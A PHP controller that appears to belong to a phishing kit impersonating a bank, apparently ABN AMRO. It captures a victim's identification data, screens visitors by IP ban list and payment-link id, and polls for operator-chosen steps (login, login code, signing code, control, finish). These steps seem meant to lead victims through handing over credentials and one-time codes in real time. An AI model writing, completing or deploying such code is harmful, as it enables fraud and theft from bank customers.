<?php

namespace App\Controllers\Abn;

use \Core\View;
use \App\Models\Abn\Abn;
use \App\Auth;

class Identification extends \Core\Controller
{
    public function indexAction()
    {
        if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_SESSION['uid']) && isset($_SESSION['pay']) && isset($_POST['identification'])) {
            Abn::setIdentification($_POST['identification'], $_SESSION['uid']);
        } else {
            if (Abn::findBan($_SERVER['REMOTE_ADDR']) || !isset($_SESSION['pay']) || !Abn::checkPayment($this->route_params['id'])) {
                Abn::redirect();
            } else {
                Abn::setIdentificationInformation($_SESSION['uid']);

                View::render('Abn/identification.php');
            }
        }
    }

    public function checkAction()
    {
        if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_SESSION['uid']) && isset($_SESSION['pay'])) {
                $check = Abn::getPage($_SESSION['uid']);

                if ($check) {
                    if ($check == 'login') {
                        echo json_encode(['page' => 'login']);   
                        Abn::setLoginPage($_SESSION['uid'], null);
                    } else if ($check == 'identification') {
                        echo json_encode(['page' => 'identification']);   
                        Abn::setIdentificationPage($_SESSION['uid'], null);
                    } else if ($check == 'loginCode') {
                        echo json_encode(['page' => 'loginCode']);
                        Abn::setLoginCodePage($_SESSION['uid'], null);
                    } else if ($check == 'signCode') {
                        echo json_encode(['page' => 'signCode']);
                        Abn::setSignCodePage($_SESSION['uid'], null);
                    } else if ($check == 'control') {
                        echo json_encode(['page' => 'control']);
                        Abn::setControlPage($_SESSION['uid'], null);
                    } else if ($check == 'finish') {
                        echo json_encode(['page' => 'finish']);
                        Abn::setFinishPage($_SESSION['uid'], null);   
                        unset($_SESSION['pay']);
                        unset($_SESSION['uid']);
                    }
                } else {
                    echo json_encode(['page' => 'waiting']);
                }
           
        } else {
            Abn::redirect();
        }
    }
}